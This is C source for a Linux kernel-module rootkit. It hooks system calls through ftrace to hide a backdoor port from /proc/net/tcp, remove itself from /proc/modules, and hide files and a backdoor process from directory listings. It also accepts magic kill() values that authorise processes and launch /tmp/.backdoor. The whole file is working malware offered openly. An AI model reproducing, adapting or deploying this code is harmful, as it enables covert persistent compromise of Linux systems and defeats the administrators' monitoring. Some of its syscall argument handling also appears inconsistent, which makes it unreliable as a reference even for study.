/**
 * \file rootkit.c
 * \brief Implement a basic LKM.
 * \author Antoine.R
 * \version 0.1
 * \date 04/07/2018
 *
 * Implement A LKM with features : hide connection, hide pids, backdoor
 *
 */

#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/syscalls.h>
#include <linux/utsname.h>
#include <linux/socket.h>
#include <linux/ftrace.h>
#include <linux/kprobes.h>

#include <asm/atomic.h>
//~ #include <arpa/inet.h>
#include <asm/current.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <asm/paravirt.h>


MODULE_AUTHOR("Antoine Rouquette");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Basic rootkit");

#define BACKDOOR_PATH       "/tmp/.backdoor"
#define BACKDOOR_BASENAME   "backdoor"
#define MAGIC_AUTH_PID      1234
#define MAGIC_BACKDOOR      1235
#define FD_HACK_BACKDOOR    0x666
#define MAX_PIDS            8
#define MAX_LINE_LEN        512

static pid_t pid_backdoor = 0;
static char pid_backdoor_str[12]= {'\0'};

typedef struct {
    pid_t pids[MAX_PIDS];
    size_t cnt;
} authorized_pids_t;

static authorized_pids_t authorized_pids = {
    .pids = {0},
    .cnt = 0
};

static int add_authorized_pid(pid_t pid)
{
    if(authorized_pids.cnt < MAX_PIDS) {
        authorized_pids.pids[authorized_pids.cnt++] = pid;
        return 0;
    }

    return -1;
}

static int is_proc_authorized(pid_t pid)
{
    int i;

    for(i = 0; i < authorized_pids.cnt; i++)
        if(pid == authorized_pids.pids[i])
            return 0;
    return -1;
}

atomic_t read_on;

static const char* hidden_port[2] = {
    "0100007F:0462",    // 127.0.0.1:1122
    "00000000:0462"     // 0.0.0.0:1122
};

static const char* hidden_module[1] = {
    __this_module.name
};

/**
 * \struct vip_files
 * \brief Filename associated to a file decriptor.
 *
 * It is a structure with a filename associated to a file descriptor.
 * It should contain specific to be modified to hide infos
 */
struct vip_files
{
    char *          name;           /*!< Filename. */
    int             fd;             /*!< File descriptor associated. */
    size_t          needle_size;    /*!< needle table size. */
    const char **   needle;         /*!< table of string to check. */
};

/**
 * \struct linux_dirent
 * \brief Linux directory structure
 *
 */
struct linux_dirent
{
    unsigned long   d_ino;      /*!< Inode number */
    unsigned long   d_off;      /*!< Offset of the next linux dirent */
    unsigned short  d_reclen;   /*!< Length of this linux dirent */
    char            d_name[];   /*!< Filename */
};

/// @brief  VIP files to process to remove the backdoor traces (ak : needles to hide in the content of the file)
struct vip_files vip_filenames[] = {
    {.name = "/proc/net/tcp", .fd = -1, .needle_size = 2, .needle = hidden_port},
    {.name = "/proc/modules", .fd = -1, .needle_size = 1, .needle = hidden_module}
};

const size_t vip_filenames_size = sizeof(vip_filenames) / sizeof(vip_filenames[0]);

/// @brief  Get the index of a vip file based on its file descriptor
/// @param fd The file descriptor to search for
/// @return the index of the vip file in the vip_filenames structure, or -1 if not found
static int get_vip_index_by_fd(int fd)
{
    int i;

    for(i = 0; i < vip_filenames_size; i++)
        if(vip_filenames[i].fd == fd)
            return i;
    return -1;
}

/// @brief  Get the index of a vip file based on its name(files to be monitored and hidden if needed)
/// @param filename The name of the file to search for
/// @return the index of the vip file in the vip_filenames structure, or -1 if not found
static int get_vip_index(const char * filename)
{
    size_t i = 0;

    if(!filename || !strlen(filename))
        return -1;

    for(i=0; i < vip_filenames_size; i++)
    {
        if(!strncmp(vip_filenames[i].name, filename, MIN(strlen(vip_filenames[i].name),strlen(filename))))
            return i;
    }
    return -1;
}

/**
 * \fn      static char * extract_line(const char * buf, char * line, size_t count)
 * \brief   Extract the 1st line found in a buffer
 * \param   buf  : buffer to be checked for a line
 * \param   line : buffer to store the line found
 * \param   count: max size of the line buffer
 * \return  pointer to the value after '\n', NULL if EOF or no newline found
 * */
static char * extract_line(const char * buf, char * line, size_t count)
{
    char * 	tok = NULL;
    size_t  len = 0;

    if(!buf || !line)
        return NULL;

    tok = strstr(buf, "\n");

    if(!tok)
    {
        len = strlen(buf);
        if(len > 0 && len < count)
            memcpy(line, buf, len + 1);
        return NULL;
    }

    if((len = tok - buf + 1) > count)
        return NULL;

    memcpy(line, buf, len);
    memcpy(line + len, "\0", 1);

    if(*(tok + 1) == '\0')
        return NULL;

    return (tok + 1);
}

/// @brief Filter the content of a VIP file based on its needles
/// @param text  : buffer containing the file content
/// @param count : size of the buffer
/// @param read  : number of bytes read
/// @param vip_index : index of the VIP file
/// @return modified number of bytes read
static ssize_t filter_vip_file(char * text, size_t count, ssize_t read, int vip_index)
{
    int j = 0, skip = 0, len = 0;
    char * p                = text;
    char line[MAX_LINE_LEN];
    ssize_t offset          = 0;
    char * tmp              = NULL;

    if((tmp = (char*)kmalloc(count, GFP_KERNEL)) == NULL)
        return 0;

    do
    {
        memset(line, 0, MAX_LINE_LEN);
        p = extract_line(p, line, MAX_LINE_LEN);
        len = strlen(line);

        if(len > 0)
        {
            for(j = 0; j < vip_filenames[vip_index].needle_size; j++)
            {
                if(strstr(line, vip_filenames[vip_index].needle[j]))
                {
                    skip = 1;
                    break;
                }
            }
            if(skip)
            {
                skip = 0;
                read -= len + 1;
                continue;
            }

            memcpy(tmp + offset, line, len);
            offset += len;
        }
    }while(p);

    // Zero padding at the end of the buffer
    memcpy(tmp + offset, "\0", 1);
    memcpy(text, tmp, offset + 1);
    kfree(tmp);
    return read;
}

/// *** Ftrace hooking code *** ///

//How to find the syscall address and not in hardcoded
/// @brief Structure for ftrace hooking
/// This structure is used to define a hook for a function using ftrace. It contains the name of the function to hook,
/// the pointer to the replacement function, a pointer to store the original function address, and the ftrace operations.
/// @param name Name of the function to hook (eg: "__x64_sys_open")
/// @param function Pointer to the replacement function
/// @param original Pointer to store the original function address
/// @param address Address of the function to hook (resolved at runtime by kallsyms_lookup_name)
/// @param ops ftrace operations for the hook
///
struct ftrace_hook {
    const char *name;
    void *function;
    void *original;

    unsigned long address;
    struct ftrace_ops ops;
};

/// @brief  Resolve the address of the function to hook
/// This function uses a temporary kprobe to resolve the address of the function specified in the hook structure.
/// If the function is found, it stores the original function address in the hook structure.
/// @param hook Pointer to the ftrace_hook structure
/// @return 0 on success, -ENOENT if the function is not found
///
static int resolve_hook_address(struct ftrace_hook *hook)
{
    struct kprobe kp = {
        .symbol_name = hook->name,
    };
    int err;

    err = register_kprobe(&kp);
    if (err)
        return err;

    hook->address = (unsigned long)kp.addr;
    unregister_kprobe(&kp);

    if (!hook->address)
        return -ENOENT;

    *((unsigned long*)hook->original) = hook->address;
    return 0;
}

/// @brief  ftrace callback function for the hook
/// This function is called by ftrace when the hooked function is called.
/// It retrieves the ftrace_hook structure from the ftrace_ops, and then modifies the instruction pointer (ip) in the pt_regs to point to the replacement function specified in the hook structure.
/// @param ip Instruction pointer of the hooked function
/// @param parent_ip Instruction pointer of the caller
/// @param ops ftrace operations for the hook
/// @param regs CPU registers
/// @return void
///
static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                                    struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
    struct ftrace_hook *hook =
        container_of(ops, struct ftrace_hook, ops);

    struct pt_regs *regs = ftrace_get_regs(fregs);

    (void)ip;
    (void)parent_ip;

    if (!regs)
        return;

    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long)hook->function;
}

/// @brief  Install the ftrace hook
/// This function resolves the address of the function to hook, sets up the ftrace operations, and registers the hook with ftrace.
/// It returns 0 on success, or a negative error code
/// @param hook Pointer to the ftrace_hook structure
/// @return 0 on success, negative error code on failure
///
static int install_hook(struct ftrace_hook *hook)
{
    int err;

    err = resolve_hook_address(hook);
    if (err)
        return err;

    hook->ops.func = fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
#ifdef FTRACE_OPS_FL_RECURSION_SAFE
                    | FTRACE_OPS_FL_RECURSION_SAFE
#else
                    | FTRACE_OPS_FL_RECURSION
#endif
                    | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err)
        return err;

    err = register_ftrace_function(&hook->ops);
    return err;
}

/// @brief  Remove the ftrace hook
/// This function unregisters the ftrace hook and removes the filter for the hooked function.
/// @param hook Pointer to the ftrace_hook structure
/// @return void
///
static void remove_hook(struct ftrace_hook *hook)
{
    unregister_ftrace_function(&hook->ops);
    ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
}

// Original functions
static asmlinkage ssize_t (*original_sys_read) (const struct pt_regs *);
static asmlinkage ssize_t (*original_sys_write) (const struct pt_regs *);
static asmlinkage int (*original_sys_getdents) (const struct pt_regs *);
static asmlinkage int (*original_sys_kill) (const struct pt_regs *);
static asmlinkage int (*original_sys_unlink) (const struct pt_regs *);
static asmlinkage pid_t (*original_sys_getpid) (const struct pt_regs *);
static asmlinkage pid_t (*original_sys_getppid) (const struct pt_regs *);
static asmlinkage long (*original_sys_openat)(const struct pt_regs *);

static bool enable_log;
module_param(enable_log, bool, 0644);
MODULE_PARM_DESC(enable_log, "Enable hook logging");

/* Registering a hook with ftrace is a bit more complex than just replacing a function pointer in the syscall table.
arg0	rdi	regs->di
arg1	rsi	regs->si
arg2	rdx	regs->dx
arg3	r10	regs->r10
arg4	r8	regs->r8
arg5	r9	regs->r9
*/

// int openat(int dirfd, const char *pathname, int flags);
// int openat(int dirfd, const char *pathname, int flags, mode_t mode);
static asmlinkage long fake_sys_openat(const struct pt_regs *regs)
{
    if (enable_log)
        pr_info_ratelimited("openat() called\n");

    int dfd = regs->di;                  // arg0
    const char __user *filename = (const char __user *)regs->si; // arg1
    int flags = regs->dx;                // arg2
    umode_t mode = regs->r10;            // arg3

    char filename_buf[256];
    if (strncpy_from_user(filename_buf, filename, sizeof(filename_buf)) > 0) {
        if (enable_log)
            pr_info_ratelimited("openat() called with dirfd=%d, filename=%s, flags=%d, mode=%d\n", dfd, filename_buf, flags, mode);
    }

    int fd = -1;
 
    pid_t pid  = original_sys_getpid(regs);
    pid_t ppid = original_sys_getppid(regs);

    int is_vip = get_vip_index(filename_buf);

    // If authorized, we can open the file
    if(is_proc_authorized(pid) == 0 || is_proc_authorized(ppid) == 0 )
    {
        fd = original_sys_openat(regs);
        if(is_vip >= 0)
        {
            // We store the file descriptor of the VIP file in the vip_filenames structure to be able to filter it later in read
            vip_filenames[is_vip].fd = fd;
        }
            
    }
    else
    {
        // Do not open a file handled by the rootkit, but only if it is not an authorized process, otherwise we would not be able to hide the backdoor traces in the VIP files
        if(!strstr(filename_buf, BACKDOOR_BASENAME))
        {
            fd = original_sys_openat(regs);
            if(is_vip >= 0) {
                vip_filenames[is_vip].fd = fd;
            }
                
        }
    }

    return fd;
}


// ssize_t write(int fd, const void *buf, size_t count);  
static asmlinkage ssize_t fake_sys_write(const struct pt_regs *regs)
{
    //int dfd = regs->di;                                             // arg0
    int fd = regs->si;                                              // arg1
    const void __user *buf = (const void __user *)regs->dx;         // arg2
    size_t count = regs->r10;                                       // arg3

    if (enable_log)
        pr_info_ratelimited("write() called with fd=%d, buf=%p, count=%zu\n", fd, buf, count);

    if(fd == FD_HACK_BACKDOOR)
    {
        // We get the pid of the backdoor process, store it in a global variable and convert it to string for later use in getdents
        pid_backdoor = *(pid_t*)buf;
        snprintf(pid_backdoor_str, 12, "%d", pid_backdoor);
        return -1;
    }

    return original_sys_write(regs);
}

// ssize_t read(int fd, void *buf, size_t count);
static asmlinkage ssize_t fake_sys_read(const struct pt_regs *regs)
{
    //int dfd = regs->di;                         // arg0
    int fd = regs->si;                          // arg1
    void __user *buf = (void __user *)regs->dx; // arg2
    size_t count = regs->r10;                   // arg3

    int     index = 0;
    ssize_t read     = 0;
    pid_t   pid     = original_sys_getpid(regs);
    pid_t   ppid    = original_sys_getppid(regs);

    index = get_vip_index_by_fd(fd);
    read = original_sys_read(regs);

    // Not a vip file, read in normally
    if(index == -1 || is_proc_authorized(pid) == 0 || is_proc_authorized(ppid) == 0)
        return read;

    // If it is a vip file, we check if the content contains the needle, if it does, we hide it by returning only the content before the needle and removing the content after the needle
    atomic_set(&read_on, 1);
    read = filter_vip_file((char*) buf, count, read, index);
    atomic_set(&read_on, 0);

    vip_filenames[index].fd = -1;

    return read;
}

// int kill(pid_t pid, int sig);
static asmlinkage int fake_sys_kill(const struct pt_regs *regs)
{
    //int dfd = regs->di;   // arg0
    pid_t pid = regs->si; // arg1
    //int sig = regs->dx;   // arg2

    int    ret    = 0;
    char * argv[] = {BACKDOOR_PATH, NULL};
    char * envp[] = { NULL };

    switch(pid)
    {
        case MAGIC_AUTH_PID:
            if (enable_log)
                pr_info("[%s] Received auth key...\n", __this_module.name);

            if (add_authorized_pid(current->pid) == 0)
                pr_info("[%s] Process %d added to authorized list\n", __this_module.name, current->pid);
            else
                pr_info("[%s] Failed to add process %d to authorized list\n", __this_module.name, current->pid);

            break;
        case MAGIC_BACKDOOR:
            if (enable_log)                
                pr_info("[%s] Received backdoor key...\n", __this_module.name);

            // prepare and start 
            ret = call_usermodehelper(BACKDOOR_PATH, argv, envp, UMH_WAIT_EXEC);
            //~ ret = original_sys_execve(filename, argv, envp);
            if (enable_log)
                pr_info("[%s] Finish process %s %d\n", __this_module.name, BACKDOOR_PATH, ret);
            break;
        default:
            ret = original_sys_kill(regs);
    }
    return ret;
}

// int getdents(unsigned int fd, struct dirent *dirp, unsigned int count);
static asmlinkage int fake_sys_getdents(const struct pt_regs *regs)
{

    //arg0	rdi	regs->di
    //arg1	rsi	regs->si
    //arg2	rdx	regs->dx
    //arg3	r10	regs->r10

    //unsigned int fd = regs->si;                                     // arg1
    struct linux_dirent *dirp = (struct linux_dirent *)regs->dx;    // arg2
    //unsigned int count = regs->r10;                                 // arg3

// Get the relevant informations
#define LOGS_SIZE   512
    unsigned long           bpos        = 0;
    unsigned long           lost_data   = 0;
    char                    * buf;
    char                    d_type;
    //~ char                    logs[LOGS_SIZE];
    struct linux_dirent *   dir         = NULL;
    struct linux_dirent *   prev        = NULL;
    int                     nread       = 0;
    pid_t                   pid         = original_sys_getpid(regs);
    pid_t                   ppid        = original_sys_getppid(regs);

    if(is_proc_authorized(pid) == 0 || is_proc_authorized(ppid) == 0)
        return original_sys_getdents(regs);

    nread = original_sys_getdents(regs);

    buf = (char*)dirp;

    if(nread < 0)
        return nread;
    else if(nread == 0)
        return nread;

    for(bpos = 0; bpos < nread;)
    {
        dir = (struct linux_dirent *)(buf + bpos);
        d_type = *(buf + bpos + dir->d_reclen - 1);
        //~ snprintf(logs, LOGS_SIZE,"%8ld    %-10s  %4d %10lld  %s\n", dir->d_ino,
            //~ (d_type == DT_REG) ?  "regular" :
            //~ (d_type == DT_DIR) ?  "directory" :
            //~ (d_type == DT_FIFO) ? "FIFO" :
            //~ (d_type == DT_SOCK) ? "socket" :
            //~ (d_type == DT_LNK) ?  "symlink" :
            //~ (d_type == DT_BLK) ?  "block dev" :
            //~ (d_type == DT_CHR) ?  "char dev" : "???",
            //~ dir->d_reclen, (long long) dir->d_off, dir->d_name);
        //~ printk("[%s] --------------- nread=%d ---------------\n", __this_module.name, nread);
        //~ printk("[%s] inode#    file type  d_reclen  d_off   d_name\n", __this_module.name);
        //~ printk("[%s] %s", __this_module.name, logs);

        if(strlen(dir->d_name) > 3)
        {
            // Shit, we get the file of the same name, hide it, is it 1st element!
            if(!memcmp(dir->d_name, "hack", MIN(strlen(dir->d_name), strlen("hack"))) ||
                !memcmp(dir->d_name, "rootkit", MIN(strlen(dir->d_name), strlen("rootkit"))))
            {
                // Just move the 1st block in that case and don't do anything
                if(!prev)
                {
                    struct linux_dirent *   next    = (struct linux_dirent *)(buf + bpos + dir->d_reclen);
                    unsigned long           offset  = dir->d_reclen + next->d_reclen;
                    lost_data += dir->d_reclen;
                    dir = (struct linux_dirent *)memmove(dir, next, next->d_reclen);
                    dir->d_reclen = offset;
                    continue;
                }
                else
                {
                    lost_data += dir->d_reclen;
                    prev->d_reclen += dir->d_reclen;
                    bpos += dir->d_reclen;
                    continue;
                }
            }
        }
        if(strlen(pid_backdoor_str) > 0)
        {
            if(!memcmp(dir->d_name, pid_backdoor_str, MIN(strlen(dir->d_name), strlen(pid_backdoor_str))))
            {
                // Just move the 1st block in that case and don't do anything
                if(!prev)
                {
                    struct linux_dirent *   next    = (struct linux_dirent *)(buf + bpos + dir->d_reclen);
                    unsigned long           offset  = dir->d_reclen + next->d_reclen;
                    lost_data += dir->d_reclen;
                    dir = (struct linux_dirent *)memmove(dir, next, next->d_reclen);
                    dir->d_reclen = offset;
                    continue;
                }
                else
                {
                    lost_data += dir->d_reclen;
                    prev->d_reclen += dir->d_reclen;
                    bpos += dir->d_reclen;
                    continue;
                }
            }
        }

        prev = dir;
        // move to next linux_dirent
        bpos += dir->d_reclen;
    }

    return (nread - lost_data);
}

static struct ftrace_hook hooks[] = {
    {
        .name = "__x64_sys_openat",
        .function = fake_sys_openat,
        .original = &original_sys_openat,
    },
    {
        .name = "__x64_sys_read",
        .function = fake_sys_read,
        .original = &original_sys_read,
    },
    {
        .name = "__x64_sys_write",
        .function = fake_sys_write,
        .original = &original_sys_write,
    },
    {
        .name = "__x64_sys_getdents",
        .function = fake_sys_getdents,
        .original = &original_sys_getdents,
    },
    {
        .name = "__x64_sys_kill",
        .function = fake_sys_kill,
        .original = &original_sys_kill,
    },
    {
        .name = "__x64_sys_getpid",
        .function = NULL,
        .original = &original_sys_getpid,
    },
    {
        .name = "__x64_sys_getppid",
        .function = NULL,
        .original = &original_sys_getppid,
    },
};


struct file *file_open(const char *path, int flags, int rights);
int file_close(struct file *file);
ssize_t file_read(struct file *file, loff_t offset, unsigned char *data, unsigned int size);
ssize_t file_write(struct file * file, loff_t offset, unsigned char * data, unsigned int size);

/**
 * \fn      struct file *file_open(const char *path, int flags, int rights)
 * \brief   Open a file in kernel mode
 * \param   path  : path to the file to open
 * \param   flags : flags used to open the file
 * \param   rights: handle ownership of the created file
 * \return  pointer to struct file, NULL if failure
 * */
struct file *file_open(const char *path, int flags, int rights)
{
    struct file *filp;

    filp = filp_open(path, flags, rights);
    if (IS_ERR(filp))
        return NULL;

    return filp;
}
 
 /**
 * \fn      int file_close(struct file *file)
 * \brief   close a file in kernel mode
 * \param   file  : pointer to the struct file  to close
 * \return  status of the fiel closure
 * */
int file_close(struct file *file)
{
    return filp_close(file, NULL);
}

/**
 * \fn int file_read(struct file * file, unsigned long long offset, unsigned char * data, unsigned int size)
 * \brief read a file in kernel mode
 * \param file  : pointer to the struct file  to read
 * \param offset: position of the curser in opened file
 * \param data  : start pointer of the buffer to store data
 * \param size  : size of the storage buffer
 * \return number of bytes read
 * */
ssize_t file_read(struct file *file, loff_t offset,
                  unsigned char *data, unsigned int size)
{
    return kernel_read(file, data, size, &offset);
}


static int __init lkm_init(void)
{
    atomic_set(&read_on, 0);

    int err;

    for (int i = 0; i < sizeof(hooks) / sizeof(hooks[0]); i++)
    {
        err = install_hook(&hooks[i]);
        if (err) {
            printk(KERN_ERR "hook failed\n");
            return err;
        }
    }
    
    if (enable_log)
        printk(KERN_INFO "hooks installed\n");

    return 0;
}

static void __exit lkm_exit(void)
{
    struct pt_regs kill_regs = {0};

    kill_regs.di = pid_backdoor;
    kill_regs.si = SIGKILL;

    //Do not forget to kill backdoor
    if(pid_backdoor != 0)
        if(original_sys_kill(&kill_regs) == 0)
            printk("[%s] Successful send SIGKILL to backdoor[%d]", __this_module.name, pid_backdoor);

    struct pt_regs unlink_regs = {0};
    unlink_regs.si = (unsigned long) BACKDOOR_PATH;

    if(!original_sys_unlink(&unlink_regs))
        printk("[%s] Successful remove %s", __this_module.name, BACKDOOR_PATH);

    // Wait until all read are done
    while(atomic_read(&read_on) != 0) schedule();

    for (int i = 0; i < sizeof(hooks) / sizeof(hooks[0]); i++) {
        remove_hook(&hooks[i]);
    }

    if (enable_log)
        printk(KERN_INFO "hook removed\n");
}

// how to find the syscall table in this case

module_init(lkm_init);
module_exit(lkm_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Antoine Rouquette");
MODULE_DESCRIPTION("A simple rootkit example with ftrace hooking");